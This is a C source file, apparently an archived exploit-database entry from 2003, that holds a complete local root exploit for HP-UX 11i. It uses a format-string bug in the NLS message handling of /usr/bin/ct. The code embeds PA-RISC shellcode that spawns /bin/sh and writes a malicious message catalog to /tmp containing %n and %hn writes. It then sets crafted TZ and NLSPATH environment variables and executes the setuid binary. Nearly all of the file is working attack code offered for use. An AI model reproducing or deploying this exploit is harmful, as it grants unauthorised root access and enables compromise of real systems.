/*******************************************************************************
*  File    : x_hp-ux11i_nls_ct.c
*  Usage   : cc x_hp-ux11i_nls_ct.c -o x_ct ; ./x_ct
*  Purpose : Get a local rootshell from /usr/bin/ct,using HP-UX location language format string bug.
*  Author  : watercloud xfocus org 
*  Tested  : On HP-UX B11.11 .
******************************************************************************/


#include<stdio.h>

#define PATH "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin"
#define TERM "TERM=xterm"
#define NLSPATH "NLSPATH=/tmp/.ex.cat"

#define CMD  "/usr/bin/ct abc_ "
#define MSG "\$set 1\n1128 "
#define PRT_ARG_NUM 2    
#define STACK_LEN 0x180  

#define ENV_BEGIN 0x40   
#define ENV_LEN   0x40  
#define LOW_STACK 0x210  

char buffer[512];
char buff[72]=
  "\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08"
  "\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
  "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16"
  "/bin/shA";
int * pint = (int *) &buff[56];
unsigned int haddr = 0;      
unsigned int dstaddr = 0;    

int main(argc,argv,env)
int argc;char ** argv;char **env;
{
    unsigned int * pa = (unsigned int*)env;
    FILE * fp = NULL;
    int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;  

    int alig1= ENV_BEGIN - xnum*8;
    int alig2=0;
    int i=0;

    while(*pa != NULL)    
        *pa++=0;
    
    if(strlen(CMD) >ENV_BEGIN-3)
    {
        printf("No enough space to alig our env!\n");
        exit(1);
    }

	printf("Exploite for HP-UX 11i NLS format bug by command ct.\n");
	printf("From watercloud@xfocus.org.  2003-1-4\n");
	printf("   Site : http://www.xfocus.net (CN).\n");
	printf("   Site : http://www.xfocus.org (EN).\n");


    haddr = (unsigned int)&fp & 0xffff0000;
    if(alig1 < 0)
      alig1+=0x10000;
    alig2 = (haddr >> 16) - alig1 -xnum*8 ;
    if(alig2 < 0)
      alig2+=0x10000;

    dstaddr= haddr+ LOW_STACK + STACK_LEN -24;  
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint = 0;
    
    /* begin to make our .cat file */
    fp = fopen("/tmp/.ex.k","w");
    if(fp == NULL)
    {
      printf("open file : /tmp/.ex.k for write error.\n");
      exit(1);
    }
    fprintf(fp,"%s",MSG);
    for(;i<xnum;i++)
      fprintf(fp,"%%.8x");
    fprintf(fp,"%%.%ix%%n",alig1);
    fprintf(fp,"%%.%ix%%hn",alig2);
    fclose(fp);
    fp = NULL;
    system("/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k");
    unlink("/tmp/.ex.k");


    sprintf(buffer,"TZ=%*s%s%*s",ENV_BEGIN-3-strlen(CMD),"A",buff,ENV_BEGIN+ENV_LEN-strlen(buff),"B");
    putenv(buffer);
    putenv(PATH);
    putenv(TERM);
    putenv(NLSPATH);
    
    printf("�ǵ�ɾ�������ʱ�ļ�(Remember to delete the  file): /tmp/.ex.cat .\n");
    execl("/usr/bin/ct","/usr/bin/ct","abc_",0);   /* ��Ϸ��ʼ�� ����  */
} 


// milw0rm.com [2003-12-16]